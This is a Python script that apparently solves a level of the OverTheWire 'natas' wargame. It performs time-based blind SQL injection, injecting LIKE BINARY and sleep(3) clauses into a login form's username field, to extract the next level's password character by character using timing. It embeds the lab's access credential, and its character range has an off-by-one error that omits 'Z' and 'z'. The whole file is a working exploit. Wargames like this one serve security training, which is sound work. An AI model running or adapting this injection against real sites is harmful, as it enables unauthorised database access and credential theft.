import requests
import grequests
import asyncio

chars = [chr(c) for c in range(ord('A'), ord('Z'))] + [chr(c) for c in range(ord('a'), ord('z'))] + [str(i) for i in range(0, 10)]
# print(chars)


async def query_web_async(querys):
    datas = [{'username': query} for query in querys]
    reqs = [grequests.post('http://natas17.natas.labs.overthewire.org/index.php',  data=data, timeout=30, auth=('natas17', r'8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')) for data in datas]
    ress = grequests.map(reqs)
    ret = []
    for res in ress:
        # print(res.elapsed.seconds)
        # print(res.text)
        if res.elapsed.seconds > 2:
            ret.append(True)
        else:
            ret.append(False)
    return ret


async def find_existent_chars_async():
    res = await query_web_async([(f'natas18" and password LIKE BINARY "%{char}%" and sleep(3)#') for char in chars])
    existent_chars = [char for char in chars if res[chars.index(char)]]
    return existent_chars


async def find_password_async(existent_chars):
    password = []
    password_len = -1
    while len(password) > password_len:
        password_len += 1
        res = await query_web_async(['natas18" and password LIKE BINARY "{}%" and sleep(3)#" #'.format(''.join(password) + str(char)) for char in existent_chars])
        next_chars = [char for char in existent_chars if res[existent_chars.index(char)]]
        for char in next_chars:
            password.append(char)
            print(char, end='', flush=True)
    print()
    return password


async def main():
    print('existent chars: ')
    ec = await find_existent_chars_async()
    print(ec)
    print('password: ')
    await find_password_async(ec)

if __name__ == '__main__':
    asyncio.run(main())